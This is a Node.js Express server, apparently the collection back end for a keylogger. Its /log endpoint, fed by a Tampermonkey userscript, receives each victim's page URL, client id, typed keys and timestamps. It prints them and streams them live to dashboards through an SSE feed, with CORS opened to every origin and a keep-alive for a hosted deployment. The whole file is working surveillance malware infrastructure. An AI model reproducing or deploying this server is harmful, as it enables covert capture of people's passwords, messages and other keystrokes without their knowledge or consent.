const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// THIS FIXES THE CORS + CREDENTIALS ERROR
app.use(cors({
  origin: '*',                    // Allows all websites
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: false              // ← THIS LINE IS CRITICAL
}));

// Handle preflight requests (OPTIONS) for all routes
app.options('*', cors());

// Parse JSON bodies
app.use(express.json({ limit: '10mb' }));

// In-memory live broadcast to all open dashboards
const clients = new Set();

// SSE endpoint for the dashboard
app.get('/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();

  const send = (data) => {
    try { res.write(`data: ${JSON.stringify(data)}\n\n`); } catch {}
  };
  clients.add(send);

  // Keep Render free tier awake
  const keepAlive = setInterval(() => res.write('data: ping\n\n'), 15000);

  req.on('close', () => {
    clients.delete(send);
    clearInterval(keepAlive);
  });
});

// MAIN LOG ENDPOINT — Tampermonkey hits this
app.post('/log', (req, res) => {
  const payload = {
    url: req.body.url || "unknown",
    client: req.body.client || "unknown",
    keys: Array.isArray(req.body.keys) ? req.body.keys : [],
    timestamps: Array.isArray(req.body.ts) ? req.body.ts : []
  };

  console.log(`[LIVE] ${payload.client} → ${payload.url} → ${payload.keys.join('')}`);

  // Broadcast to all open dashboards instantly
  for (const send of clients) send(payload);

  res.json({ status: "ok" });
});

// Simple homepage
app.get('/', (req, res) => {
  res.send(`
    <h1>CentralEye Tracker Server — LIVE</h1>
    <p>Open your dashboard: <a href="https://fs-tracker-online.onrender.com">https://fs-tracker-online.onrender.com</a></p>
  `);
});

app.listen(PORT, () => {
  console.log(`Server running → https://fs-tracker-online.onrender.com`);
  console.log(`Dashboard → https://fs-tracker-online.onrender.com`);
});